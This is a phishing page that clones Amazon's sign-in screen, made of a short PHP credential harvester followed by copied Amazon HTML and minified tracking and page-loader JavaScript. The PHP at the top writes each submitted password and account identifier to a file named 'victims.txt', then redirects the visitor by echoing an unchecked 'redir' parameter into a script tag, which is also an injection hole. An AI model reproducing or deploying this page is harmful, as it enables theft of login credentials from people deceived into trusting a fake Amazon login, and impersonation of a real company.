<?php
$u = $_GET['id'];
$p = $_POST['password-field'];
if ($p){
  $f = fopen('victims.txt','a+');
    fwrite($f,$u.'<!:!>'.$p."\n");
    fclose($f);
    echo "<script>window.location = '".$_GET['redir']."'</script>";
}
?>
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.20.8-2021-02-19"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="/signin/Amazon Sign-In-pwd_files/31YXrY93hfL.js" crossorigin="anonymous"></script>
<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>
<script type="text/javascript">
window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = 'GD8BTMZD2D0V8PWFQSXE',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '136-0636727-0142044',
    ue_sn = 'www.amazon.com',
    ue_furl = 'fls-na.amazon.com',
    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:136-0636727-0142044:GD8BTMZD2D0V8PWFQSXE$uedata=s:',
    ue_sbuimp = 1,
    ue_bfd = 1000,
    ue_fnt = 0,

    ue_swi = 1;
var ue_viz=function(){(function(c,e,a){function k(b){if(c.ue.viz.length<p&&!l){var a=b.type;b=b.originalEvent;/^focus./.test(a)&&b&&(b.toElement||b.fromElement||b.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),c.ue.viz.push(a+":"+(+new Date-c.ue.t0)),"visible"==a&&(ue.isl&&uex("at"),l=1))}}for(var l=0,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+"isibilityState";
k({});d&&e.addEventListener(g,k,0);c.ue&&d&&(c.ue.pageViz={event:g,propHid:f})})(ue_csm,document,window)};

(function(d,k,L){function F(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function t(a){return"undefined"===typeof a}function B(a,b){for(var c in b)b[u](c)&&(a[c]=b[c])}function G(a){try{var b=L.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function M(n,b,c){var e=(v||{}).type;2!==e&&1!==e&&(n&&(d.ue_id=a.id=a.rid=n,w=w.replace(/((.*?:){2})(\w+)/,function(a,b){return b+n})),b&&(w=w.replace(/(.*?:)(\w|-)+/,function(a,c){return c+b}),d.ue_sid=b),c&&a.tag("page-source:"+
c),d.ue_fpf=w)}function N(){var a={};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[u](c)&&b.push(c);return b}}function x(d,b,c,e){e=e||+new C;var h,p;if(b||t(c)){if(d)for(p in h=b?g("t",b)||g("t",b,{}):a.t,h[d]=e,c)c[u](p)&&g(p,b,c[p]);return e}}function g(d,b,c){var e=b&&b!=a.id?a.sc[b]:a;e||(e=a.sc[b]={});"id"===d&&c&&(O=1);return e[d]=c||e[d]}function P(d,b,c,e,h){c="on"+c;var g=b[c];"function"===typeof g?d&&(a.h[d]=g):g=function(){};b[c]=function(a){h?(e(a),g(a)):(g(a),e(a))};b[c]&&(b[c].isUeh=
1)}function Q(n,b,c,e){function r(b,c){var d=[b],e=0,f={},h,k;c?(d.push("m=1"),f[c]=1):f=a.sc;for(k in f)if(f[u](k)){var r=g("wb",k),l=g("t",k)||{},p=g("t0",k)||a.t0,m;if(c||2==r){r=r?e++:"";d.push("sc"+r+"="+k);for(m in l)3>=m.length&&!t(l[m])&&null!==l[m]&&d.push(m+r+"="+(l[m]-p));d.push("t"+r+"="+l[n]);if(g("ctb",k)||g("wb",k))h=1}}!H&&h&&d.push("ctb=1");return d.join("&")}function p(b,c,f,e){if(b){var g=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),e.src=b,a.count&&a.count("postbackImageSize",
b.length));if(w){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new C-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));g&&!g.ts&&g.startTimer();a.b&&(g=a.b,a.b="",p(g,c,f,1))}}function z(b){var c=v?v.type:D,d=2==c||a.isBFonMshop,c=c&&!d,e=a.bfini;O||(e&&1<e&&(b+="&bfform=1",c||(a.isBFT=e-1)),d&&(b+="&bfnt=1",a.isBFT=a.isBFT||1),a.ssw&&a.isBFT&&(a.isBFonMshop&&(a.isNRBF=0),t(a.isNRBF)&&(d=a.ssw(a.oid),d.e||t(d.val)||(a.isNRBF=1<d.val?0:1)),
t(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||t(c))){for(var m in c)c[u](m)&&g(m,b,c[m]);a.isBFonMshop||x("pc",b,c);m=g("id",b)||a.id;var s=g("id2",b),f=a.url+"?"+n+"&v="+a.v+"&id="+m,H=g("ctb",b)||g("wb",b),y;H&&(f+="&ctb="+H);s&&(f+="&id2="+s);1<d.ueinit&&(f+="&ic="+d.ueinit);if(!("ld"!=n&&"ul"!=n||b&&b!=m)){if("ld"==n){try{k[I]&&k[I].isUeh&&(k[I]=null)}catch(G){}if(k.chrome)for(s=0;s<J.length;s++)R(E,J[s]);(s=L.ue_backdetect)&&s.ue_back&&
s.ue_back.value++;d._uess&&(y=d._uess());a.isl=1}a._bf&&(f+="&bf="+a._bf());d.ue_navtiming&&h&&(g("ctb",m,"1"),a.isBFonMshop||x("tc",D,D,K));!A||a.isBFonMshop||S||(h&&B(a.t,{na_:h.navigationStart,ul_:h.unloadEventStart,_ul:h.unloadEventEnd,rd_:h.redirectStart,_rd:h.redirectEnd,fe_:h.fetchStart,lk_:h.domainLookupStart,_lk:h.domainLookupEnd,co_:h.connectStart,_co:h.connectEnd,sc_:h.secureConnectionStart,rq_:h.requestStart,rs_:h.responseStart,_rs:h.responseEnd,dl_:h.domLoading,di_:h.domInteractive,de_:h.domContentLoadedEventStart,
_de:h.domContentLoadedEventEnd,_dc:h.domComplete,ld_:h.loadEventStart,_ld:h.loadEventEnd,ntd:("function"!==typeof A.now||t(K)?0:new C(K+A.now())-new C)+a.t0}),v&&B(a.t,{ty:v.type+a.t0,rc:v.redirectCount+a.t0}),S=1);a.isBFonMshop||B(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(f+="&ifr=1")}x(n,b,c,e);c="ld"==n&&b&&g("wb",b);var q,l;c||b&&b!==m||$(b);c||m==a.oid||aa(m,(g("t",b)||{}).tc||+g("t0",b),+g("t0",b));(e=d.ue_mbl)&&e.cnt&&!c&&(f+=e.cnt());c?g("wb",b,2):"ld"==n&&(a.lid=F(m));for(q in a.sc)if(1==
g("wb",q))break;if(c){if(a.s)return;f=r(f,null)}else e=r(f,null),e!=f&&(e=z(e),a.b=e),y&&(f+=y),f=r(f,b||a.id);f=z(f);if(a.b||c)for(q in a.sc)2==g("wb",q)&&delete a.sc[q];y=0;a._rt&&(f+="&rt="+a._rt());e=k.csa;if(!c&&e)for(l in q=g("t",b)||{},e=e("PageTiming"),q)q[u](l)&&e("mark",ba[l]||l,q[l]);c||(a.s=0,(l=d.ue_err)&&0<l.ec&&l.pec<l.ec&&(l.pec=l.ec,f+="&ec="+l.ec+"&ecf="+l.ecf),y=g("ctb",b),"ld"!==n||b||a.markers||(a.markers={},B(a.markers,g("t",b))),g("t",b,{}));a.tag&&a.tag().length&&(f+="&csmtags="+
a.tag().join("|"),a.tag=N());l=a.viz||[];(q=l.length)&&(f+="&viz="+l.splice(0,q).join("|"));t(d.ue_pty)||(f+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(f+="&tid="+a.tabid);a.aftb&&(f+="&aftb=1");!a._ui||b&&b!=m||(f+=a._ui());a.a=f;p(f,n,y,c)}}function $(a){var b=k.ue_csm_markers||{},c;for(c in b)b[u](c)&&x(c,a,D,b[c])}function z(a,b,c){c=c||k;if(c[T])c[T](a,b,!1);else if(c[U])c[U]("on"+a,b)}function R(a,b,c){c=c||k;if(c[V])c[V](a,b,!1);else if(c[W])c[W]("on"+a,b)}function X(){function a(){d.onUl()}
function b(a){return function(){c[a]||(c[a]=1,Q(a))}}var c={},e,g;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(z(E,a),J.push(a)):e[E]=d.onUl;for(g in e)e[u](g)&&P(0,k,g,e[g]);d.ue_viz&&ue_viz();z("load",d.onLd);x("ue")}function aa(g,b,c){var e=d.ue_mbl,h=k.csa,p=h&&h("SPA"),h=h&&h("PageTiming");e&&e.ajax&&e.ajax(b,c);p&&h&&(p("newPage",{requestId:g,transitionType:"soft"}),h("mark","transitionStart",b));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||
{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.215338.0";a.paused=!1;var u="hasOwnProperty",E="beforeunload",I="on"+E,T="addEventListener",V="removeEventListener",U="attachEvent",W="detachEvent",ba={cf:"criticalFeature",af:"aboveTheFold",fn:"functional",fp:"firstPaint",fcp:"firstContentfulPaint",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},C=k.Date,A=k.performance||k.webkitPerformance,h=(A||{}).timing,
v=(A||{}).navigation,K=(h||{}).navigationStart,w=d.ue_fpf,O=0,S=0,J=[],D;a.oid=F(a.id);a.lid=F(a.id);a._t0=a.t0;a.tag=N();a.ifr=k.top!==k.self||k.frameElement?1:0;a.markers=null;a.attach=z;a.detach=R;if("000-0000000-8675309"===d.ue_sid){var Y=G("cdn-rid"),Z=G("session-id");Y&&Z&&M(Y,Z,"cdn")}d.uei=X;d.ueh=P;d.ues=g;d.uet=x;d.uex=Q;a.reset=M;a.pause=function(d){a.paused=d};X()})(ue_csm,window,ue_csm.document);


ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);



var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- 1byn3flu5eoe0o4 --><script>var aPageStart = (new Date()).getTime();</script>
    <title dir="ltr">Amazon Sign-In</title>

    
      

      
        <link rel="stylesheet" href="/signin/Amazon Sign-In-pwd_files/61A6IErPNXL._RC_11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css">
<link rel="stylesheet" href="/signin/Amazon Sign-In-pwd_files/01SdjaY0ZsL._RC_31jdWD+JB+L.css,41RVmSDdlvL.css_.css">
<link rel="stylesheet" href="/signin/Amazon Sign-In-pwd_files/11G4j12sgkL.css">
<script>
(function(f,h,Q,E){function F(a){v&&v.tag&&v.tag(q(":","aui",a))}function w(a,b){v&&v.count&&v.count("aui:"+a,0===b?0:b||(v.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function x(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function G(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function va(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(ca,0),S=!0))};for(g();c--;)da[a[c]]?g():(A[a[c]]=A[a[c]]||[]).push(g)}function wa(a,b,c,e,g){var d=h.createElement(a?"script":"link");x(d,"error",e);g&&x(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){wa(b,c,d,function(b){T?w("resource_unload"):
d?(d=!1,w("resource_retry"),g()):(w("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;w("resource_count");var d=!0;return!g()}}function xa(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)H.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](H[c[d]],e):H[c[d]]);return g}function B(a,b,c,e,g){return function(d,
h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=C(),a=h.apply(f,xa(d,k,l)),p.end=C());if(b){H[d]=a;a=d;for(da[a]=!0;(A[a]||[]).length;)A[a].shift()();delete A[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=E);b&&(d=d?d.replace(ha,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=a[m].replace(ha,"");var p=ia[d||"anon"+ ++ya]={depend:l,registered:C(),
namespace:k.namespace};c?n():va(l,k.guardFatal(d,n));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ja(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:B(b,!1,a,!1,this),register:B(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=E);var g=this.attribution;return function(){y.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);y.pop();return d}}}function I(a,b){this.load={js:ea(this,!0),css:ea(this)};G(this,"namespace",
b);G(this,"attribution",a)}function ka(){h.body?t.trigger("a-bodyBegin"):setTimeout(ka,20)}function D(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function la(a){try{return a()}catch(b){return!1}}function J(){if(K){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,L=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?D(n,"a-ws"):n.className=X(n,"a-ws")):0<L&&(L--,ma=
setTimeout(J,16))}}function za(a){(K=a===E?!K:!!a)&&J()}function Aa(){return K}function u(a,b){return"sw:"+(b||"")+":"+a+":"}function na(){oa.forEach(function(a){F(a)})}function p(a){oa.push(a)}function pa(a,b,c,e){if(c){b=m(/Chrome/i)&&!m(/Edge/i)&&!m(/OPR/i)&&!a.capabilities.isAmazonApp&&!m(new RegExp(Z+"bwv"+Z+"b"));var g=u(e,"browser"),d=u(e,"prod_mshop"),f=u(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(p(g+"supported"),c.browser.action(g,e));!b&&c.browser&&p(g+"unsupported");c.prodMshop&&
p(d+"unsupported");c.betaMshop&&p(f+"unsupported")}}"use strict";var M=Q.now=Q.now||function(){return+new Q},C=function(a){return a&&a.now?a.now.bind(a):M}(f.performance),N=C(),r=f.AmazonUIPageJS||f.P;if(r&&r.when&&r.register){N=[];for(var l=h.currentScript;l;l=l.parentElement)l.id&&N.push(l.id);return r.log("A copy of P has already been loaded on this page.","FATAL",N.join(" "))}var v=f.ue;F();F("aui_build_date:3.20.8-2021-02-19");var R=[],S=!1;var ca=function(){for(var a=setTimeout(ca,0),b=M();R.length;)if(R.shift()(),
50<M()-b)return;clearTimeout(a);S=!1};var da={},A={},fa={},T=!1;x(f,"beforeunload",function(){T=!0;setTimeout(function(){T=!1},1E4)});var ha=/^prv:/,V={},H={},U={},ia={},ya=0,Z=String.fromCharCode(92),y=[],qa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):E);var d=y.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||
"ERROR",a,"thrown by",g.attribution].join(" "));y=[];qa&&(d=[].slice.call(arguments),d[4]=g,qa.apply(f,d))};I.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=
y[y.length-1];return b?W(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:B([],!0,!0,!0),register:B([],!0),execute:B([]),AUI_BUILD_DATE:"3.20.8-2021-02-19",when:ja(),now:ja(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new I(a)},
_namespace:function(a,b){return new I(a,b)}};var t=G(f,"AmazonUIPageJS",new I);var O=t._namespace("PageJS","AmazonUI");O.declare("prv:p-debug",ia);t.declare("p-recorder-events",[]);t.declare("p-recorder-stop",function(){});G(f,"P",t);ka();if(h.addEventListener){var ra;h.addEventListener("DOMContentLoaded",ra=function(){t.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ra,!1)},!1)}var n=h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText=
"background-image:-webkit-gradient(linear,left top,right bottom,from(#1E4),to(white));background-image:-webkit-linear-gradient(left top,#1E4,white);background-image:linear-gradient(left top,#1E4,white);";return~b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);
return a}}}();r=n.className;var sa=/(^| )a-mobile( |$)/.test(r),ta=/(^| )a-tablet( |$)/.test(r),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},
dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==
f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;w("hiRes"+(sa?"Mobile":ta?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return sa},tablet:function(){return ta},rtl:function(){return"rtl"===n.dir}};for(l in k)k.hasOwnProperty(l)&&(k[l]=la(k[l]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=la(function(){return aa.test(ba[P])});var K=!0,ma=0,Y=
{w:0,h:0},L=4;J();x(f,"resize",function(){clearTimeout(ma);L=4;J()});var ua={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");D(n,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||D(n,"a-ember");r=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&r.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));D(n,r.join(" "));n.setAttribute("data-aui-build-date",
"3.20.8-2021-02-19");t.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&ua,toggleResponsiveGrid:za,responsiveGridEnabled:Aa}});m(/UCBrowser/i)||k.localStorage&&D(n,ua.getItem("a-font-class"));t.declare("a-event-revised-handling",!1);try{var z=navigator.serviceWorker}catch(a){F("sw:nav_err")}z&&(x(z,"message",function(a){a&&a.data&&w(a.data.k,a.data.v)}),z.controller&&z.controller.postMessage("MSG-RDY"));var oa=[];(function(a){var b=a.reg,c=a.unreg;z&&z.getRegistrations?
(O.when("A","a-util").execute(function(a,b){pa(a,b,c,"unregister")}),x(f,"load",function(){O.when("A","a-util").execute(function(a,c){pa(a,c,b,"register");na()})})):(b&&(b.browser&&p(u("register","browser")+"unsupported"),b.prodMshop&&p(u("register","prod_mshop")+"unsupported"),b.betaMshop&&p(u("register","beta_mshop")+"unsupported")),c&&(c.browser&&p(u("unregister","browser")+"unsupported"),c.prodMshop&&p(u("unregister","prod_mshop")+"unsupported"),c.betaMshop&&p(u("unregister","beta_mshop")+"unsupported")),
na())})({reg:{},unreg:{}});t.declare("a-fix-event-off",!1);w("pagejs:pkgExecTime",C()-N)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,61h1ZQEtf7L.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js?AUIClients/AmazonUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51Qm24OwGQL.js_.js?AUIClients/AuthenticationPortalAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01wGDSlxwdL.js?AUIClients/AuthenticationPortalInlineAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31EB1+1RLvL.js?AUIClients/CVFAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/81JZFvi7+TL.js?AUIClients/SiegeClientSideEncryptionAUI');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/71vqZ1F8KbL.js?AUIClients/FWCIMAssets');
</script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/61-6nKPKyWL._RC_11Y+5x+kkTL.js,61h1ZQEtf7L.js,31x4ENTlVIL.js,31f4+QIEeqL.js,01N6xzIJxbL.js,518BI433aLL.js,01rpauTep4L.js,31QZSjMuoeL.js,61ofwvddDeL.js,01KsMxlPtzL.js_.js"></script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/21G215oqvfL._RC_21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,51Qm24OwGQL.js_.js"></script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/01wGDSlxwdL.js"></script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/31EB1+1RLvL.js"></script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/81JZFvi7+TL.js"></script><script type="text/javascript" async="" crossorigin="anonymous" src="/signin/Amazon Sign-In-pwd_files/71vqZ1F8KbL.js"></script>

      
    
  <script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);


(function(s,l){function m(b,e,c){c=c||new Date(+new Date+t);c="expires="+c.toUTCString();n.cookie=b+"="+e+";"+c+";path=/"}function p(b){b+="=";for(var e=n.cookie.split(";"),c=0;c<e.length;c++){for(var a=e[c];" "==a.charAt(0);)a=a.substring(1);if(0===a.indexOf(b))return decodeURIComponent(a.substring(b.length,a.length))}return""}function q(b,e,c){if(!e)return b;-1<b.indexOf("{")&&(b="");for(var a=b.split("&"),f,d=!1,h=!1,g=0;g<a.length;g++)f=a[g].split(":"),f[0]==e?(!c||d?a.splice(g,1):(f[1]=c,a[g]=
f.join(":")),h=d=!0):2>f.length&&(a.splice(g,1),h=!0);h&&(b=a.join("&"));!d&&c&&(0<b.length&&(b+="&"),b+=e+":"+c);return b}var k=s.ue||{},t=3024E7,n=ue_csm.document||l.document,r=null,d;a:{try{d=l.localStorage;break a}catch(u){}d=void 0}k.count&&k.count("csm.cookieSize",document.cookie.length);k.cookie={get:p,set:m,updateCsmHit:function(b,e,c){try{var a;if(!(a=r)){var f;a:{try{if(d&&d.getItem){f=d.getItem("csm-hit");break a}}catch(k){}f=void 0}a=f||p("csm-hit")||"{}"}a=q(a,b,e);r=a=q(a,"t",+new Date);
try{d&&d.setItem&&d.setItem("csm-hit",a)}catch(h){}m("csm-hit",a,c)}catch(g){"function"==typeof l.ueLogError&&ueLogError(Error("Cookie manager: "+g.message),{logLevel:"WARN"})}}}})(ue_csm,window);


